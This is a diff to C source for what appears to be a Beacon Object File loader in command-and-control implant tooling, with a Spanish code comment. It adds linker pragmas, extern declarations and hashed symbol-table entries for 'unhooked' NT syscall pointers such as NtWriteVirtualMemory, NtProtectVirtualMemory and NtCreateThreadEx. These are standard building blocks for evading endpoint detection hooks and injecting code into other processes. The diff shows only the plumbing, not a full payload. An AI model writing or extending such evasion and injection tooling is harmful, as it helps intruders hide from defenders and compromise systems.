@@ -225,6 +225,11 @@
 #pragma comment(linker, "/INCLUDE:__imp_IsWow64Process")
 #pragma comment(linker, "/INCLUDE:__imp_Process32First")
 #pragma comment(linker, "/INCLUDE:__imp_CreateToolhelp32Snapshot")
+#pragma comment(linker, "/INCLUDE:g_pNtCreateFileUnhooked")
+#pragma comment(linker, "/INCLUDE:g_pNtWriteVirtualMemoryUnhooked")
+#pragma comment(linker, "/INCLUDE:g_pNtProtectVirtualMemoryUnhooked")
+#pragma comment(linker, "/INCLUDE:g_pNtResumeThreadUnhooked")
+#pragma comment(linker, "/INCLUDE:g_pNtCreateThreadExUnhooked")
 
 extern PVOID __imp_BeaconPrintf;
 extern PVOID __imp_BeaconOutput;
@@ -444,6 +449,12 @@ extern PVOID __imp_Process32Next;
 extern PVOID __imp_IsWow64Process;
 extern PVOID __imp_Process32First;
 extern PVOID __imp_CreateToolhelp32Snapshot;
+
+extern PVOID g_pNtCreateFileUnhooked;
+extern PVOID g_pNtWriteVirtualMemoryUnhooked;
+extern PVOID g_pNtProtectVirtualMemoryUnhooked;
+extern PVOID g_pNtResumeThreadUnhooked;
+extern PVOID g_pNtCreateThreadExUnhooked;
 // Definiciones completas de relocaciones x64 (agrega esto arriba de todo, cerca de otros #include o #define)
 #define IMAGE_REL_AMD64_ABSOLUTE    0x0000
 #define IMAGE_REL_AMD64_ADDR64      0x0001
@@ -748,6 +759,11 @@ static SymbolHash g_symbol_table[] = {
     { 0xB9A0744A, (void*)&__imp_IsWow64Process },
     { 0xAC11E754, (void*)&__imp_Process32First },
     { 0xFD247938, (void*)&__imp_CreateToolhelp32Snapshot },
+    { 0xE60AAD2E, (void*)&g_pNtCreateFileUnhooked },
+    { 0x4D6684E5, (void*)&g_pNtWriteVirtualMemoryUnhooked },
+    { 0x51115B9B, (void*)&g_pNtProtectVirtualMemoryUnhooked },
+    { 0x88FE4803, (void*)&g_pNtResumeThreadUnhooked },
+    { 0x14F75183, (void*)&g_pNtCreateThreadExUnhooked },
     { 0x720d4ddc, (void*)wsprintfW },                 // "__imp_wsprintfW"
     { 0x24b5251e, (void*)wcscpy }, // "wcscpy"
     { 0xbb5f990c, (void*)wcsncpy }, // "wcsncpy"
